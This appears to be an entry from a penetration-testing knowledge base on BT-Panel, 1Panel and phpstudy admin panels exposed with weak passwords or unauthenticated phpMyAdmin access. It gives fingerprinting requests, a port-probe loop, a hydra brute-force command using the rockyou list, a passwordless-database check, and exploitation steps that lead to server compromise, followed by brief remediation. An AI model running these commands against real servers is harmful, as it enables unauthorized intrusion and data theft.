---
id: "panel-bt-1panel"
title: "BT / 1Panel weak passwords and unauthenticated access (the most common admin panels on black/gray-market sites)"
kind: "configuration"
cve: null
related-cves: null
cve-note: "None (configuration flaw)"
severity: "critical"
cvss: 9.2
severity-basis: "cvss"
severity-note: null
product: "BT-Panel / 1Panel / Xiaopi phpstudy"
versions: "Any"
ports: "8888, 888, 8443, 2087, 9999"
keywords: "BT-Panel, bt, 1panel, panel, weak passwords, unauthenticated access, server"
entry: ":8888/<random-entry-path> or :8888/login"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (configuration flaws)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

```
GET http://target:8888/        → BT login page / 301 to a random entry path
GET http://target:9999/        → 1Panel login page
Page title/logo contains BT-Panel / 1Panel
```

## Prerequisites

- Panel ports are publicly accessible (operators of black/gray-market sites often favor convenience).

## PoC

```bash
# 1) Probe for panels
for p in 8888 888 8443 2087 9999; do
  echo "== $p"; curl -s -o /dev/null -w '%{http_code}\n' --max-time 4 "http://target:$p/"
done

# 2) Default/weak passwords (BT 6.x once defaulted to admin/random; 7.x passwords are often changed to weak ones)
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form \
  '/login:username=^USER^&password=^PASS^:Incorrect username or password'

# 3) Common historical BT unauthenticated access (direct access to the phpmyadmin directory in older versions)
curl -s -o /dev/null -w '%{http_code}\n' 'http://target:888/pma/'
# Confirmation: pma returns 200 and allows passwordless access = direct database dumping
```

## Exploitation Steps

1. First scan ports and login pages (read-only);
2. If weak passwords (10–20 common ones) fail, move to CVEs/unauthenticated access;
3. Panel access allows database creation, file modification, and scheduled-task inspection—effectively server compromise;
4. Evidence: panel 200 response + successful login page (redact the IP).

## Remediation and Mitigation

- Bind panels only to internal interfaces/use an IP allowlist; strong passwords + two-step verification; disable direct phpmyadmin access.

## References

- Official BT/1Panel security recommendations.
